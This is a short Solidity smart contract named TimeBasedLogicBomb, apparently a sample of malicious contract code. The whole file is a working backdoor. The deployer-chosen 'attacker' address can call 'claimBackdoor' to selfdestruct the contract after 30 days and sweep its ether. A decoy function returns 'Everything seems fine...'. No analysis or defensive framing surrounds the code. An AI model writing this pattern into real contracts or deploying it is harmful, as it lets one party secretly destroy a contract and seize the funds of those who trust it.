// SPDX-License-Identifier: MIT
pragma solidity ^0.8.21;

contract TimeBasedLogicBomb {
    address public attacker;
    uint256 public deployTime;

    constructor(address _attacker) {
        attacker = _attacker;
        deployTime = block.timestamp;
    }

    function claimBackdoor() external {
        require(msg.sender == attacker, "Not authorized");

        // Logic bomb activates after 30 days
        if (block.timestamp > deployTime + 30 days) {
            selfdestruct(payable(attacker));
        }
    }

    function legitFunction() external pure returns (string memory) {
        return "Everything seems fine...";
    }
}
